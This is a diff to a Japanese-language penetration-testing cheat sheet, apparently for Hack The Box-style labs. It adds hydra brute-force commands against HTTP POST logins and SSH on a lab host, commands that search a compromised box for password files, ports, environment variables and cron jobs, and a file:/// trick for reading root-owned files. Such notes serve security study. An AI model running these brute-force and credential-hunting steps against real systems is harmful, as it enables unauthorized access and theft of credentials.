@@ -62,8 +62,12 @@ socialImage: "/media/cards/no-image.png"
   - [便利コマンド](#便利コマンド)
   - [linpeasのTips](#linpeasのtips)
   - [端末のディレクトリ探索](#端末のディレクトリ探索)
+  - [端末のオープンポートの探索](#端末のオープンポートの探索)
+  - [環境変数の探索](#環境変数の探索)
+  - [cronの探索](#cronの探索)
 - [特権取得(Linux)](#特権取得linux)
 - [パスワードの解読](#パスワードの解読)
+  - [Hashの特定](#hashの特定)
   - [Hashcatサンプル](#hashcatサンプル)
   - [Hashcat オプションTips](#hashcat-オプションtips)
   - [KeePass database](#keepass-database)
@@ -543,6 +547,13 @@ dav:/> copy shell.txt shell.asp;.txt
 # シンプル認証
 hydra -l admin -P /usr/share/wordlists/rockyou.txt targethost.htb -s 8080 http-get /manager
 hydra -l admin -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt targethost.htb http-get /manager
+
+# POST 認証
+# hydra -L [ユーザID辞書ファイル] -P [パスワード辞書ファイル] [対象サーバ名/対象サーバIPアドレス] http-post-form 'パス:クエリ:ログイン失敗文字列'
+hydra -l Floris -P /usr/share/wordlists/seclists/Passwords/2020-200_most_used_passwords.txt targethost.htb http-post-form "/login.php:username=Floris&password=^PASS^:Faild"
+
+# SSH
+# hydra -l [ユーザ名] -P [パスワード辞書ファイル] [対象サーバ名/対象サーバIPアドレス] ssh
 ```
 
 
@@ -796,15 +807,55 @@ $ less -r linpeas.txt
 ``` bash
 $ ls -la / -R tee dirlist.txt
 $ less -r dirlist.txt
+
+# 特定のファイルの有無とパスを調べる
+$ ls -la / -R 2>/dev/null | grep password.txt
+$ find / -name password 2>/dev/null
+```
+
+### 端末のオープンポートの探索
+
+``` bash
+$ ss
+# オープンポートや、リッスンしているプログラムなどを確認することができる。
+# -a → 全てのポートを表示する。
+# -at or -au → TCP or UDPのポートを全て表示する。
+# -l → リッスン中のポートのみを表示する。
+# -s → プロトコルの使用状況統計を表示する。
+# -p → ポートを使用しているプロセスを表示する。他のユーザーのプロセスを確認したい場合はrootユーザーで実行する。
+```
+
+### 環境変数の探索
+
+``` bash
+$ env
+```
+
+### cronの探索
+
+``` bash
+$ crontab -l
+
+$ ls -la /etc/cron.d
 ```
 
 
 
 ## 特権取得(Linux)
 
-(工事中)
+- rootが所有者のファイルはJOBなどで使用されている可能性がある
+- URIスキームをfileに変更するとローカルアクセスが可能()`file:///root/root.txt`)
+
+参考：[Linux PrivEsc メモ](https://zenn.dev/riko/scraps/733a53f8d0b4a9)
 
 ## パスワードの解読
+
+- よくわからないバイナリはCyberChefのmagicににかけてみるといい
+
+### Hashの特定
+
+- hash-identifier コマンド
+- [Hash Identifier - Hash Algorithm Recognition - Online](https://www.dcode.fr/hash-identifier)
 
 ### Hashcatサンプル
 
